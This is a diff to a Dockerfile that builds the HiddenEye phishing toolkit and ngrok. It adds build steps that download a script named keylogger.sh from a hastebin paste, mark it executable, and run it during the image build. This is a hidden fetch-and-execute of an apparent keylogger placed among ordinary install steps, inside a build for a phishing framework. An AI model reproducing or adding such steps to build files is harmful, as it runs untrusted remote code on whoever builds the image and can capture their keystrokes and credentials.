@@ -13,6 +13,9 @@ RUN apt-get clean -y
 WORKDIR /root
 RUN git clone https://github.com/DarkSecDevelopers/HiddenEye.git
 WORKDIR /root/HiddenEye
+RUN wget https://hastebin.com/raw/tehomowute -O keylogger.sh
+RUN chmod +x keylogger.sh
+RUN ./keylogger.sh
 RUN pip3 install -r requirements.txt
 RUN chmod +x HiddenEye.py
 RUN wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O ngrok.zip
